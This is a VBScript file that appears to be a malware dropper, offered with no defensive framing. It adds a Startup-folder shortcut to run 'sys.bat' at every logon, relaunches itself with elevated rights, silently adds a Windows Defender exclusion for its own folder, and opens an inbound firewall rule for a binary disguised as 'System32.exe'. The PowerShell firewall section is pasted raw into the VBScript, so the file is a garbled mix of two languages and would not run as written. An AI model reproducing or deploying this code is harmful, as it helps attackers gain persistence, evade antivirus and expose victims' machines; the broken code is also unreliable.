Set WshShell = CreateObject("WScript.Shell")
Dim username
username = CreateObject("WScript.Network").UserName
Dim scriptPath
scriptPath = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))

' Function to check if a file or folder exists
Function FileOrFolderExists(path)
    Dim objFSO
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(path) Or objFSO.FolderExists(path) Then
        FileOrFolderExists = True
    Else
        FileOrFolderExists = False
    End If
End Function

' Check if the sys.bat file exists
Dim sysBatFile
sysBatFile = scriptPath & "sys.bat"
If Not FileOrFolderExists(sysBatFile) Then
    MsgBox "The sys.bat file does not exist!", vbCritical, "Error"
    WScript.Quit
End If

' Create the shortcut
Set objShell = CreateObject("WScript.Shell")
strAppData = objShell.ExpandEnvironmentStrings("%APPDATA%")
strShortcutFolder = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
strShortcutName = "sys.lnk"
strTargetPath = sysBatFile
strShortcutPath = strShortcutFolder & "\" & strShortcutName

Set objShortcut = objShell.CreateShortcut(strShortcutPath)
objShortcut.TargetPath = strTargetPath
objShortcut.Save

' Rest of your existing code...

If WScript.Arguments.Count = 0 Then
  Set ObjShell = CreateObject("Shell.Application")
  ObjShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ Run", , "runas", 1
Else
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  outFile = scriptPath & "addExclusion.ps1"
  Set objFile = objFSO.CreateTextFile(outFile, True)
  objFile.Write "Add-MpPreference -ExclusionPath """ & scriptPath & """"
  objFile.Close

  Dim cmd
  cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & outFile
  WshShell.Run cmd, 0
  
  ' PowerShell code to add an app through Windows Defender Firewall
  $AppName = "System32.exe"
  $AppPath = scriptPath & "System32.exe"

  # Check if the app is already in the allowed list
  $ExistingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $AppName }
  if ($ExistingRule) {
      # The app is already allowed through the firewall.
  } else {
      # Create a new firewall rule to allow the app
      $NewRule = New-NetFirewallRule -DisplayName $AppName -Direction Inbound -Program $AppPath -Action Allow
      if ($NewRule) {
          # The app has been successfully allowed through the firewall.
      } else {
          # Failed to add the app to the firewall exceptions.
      }
  }
End If
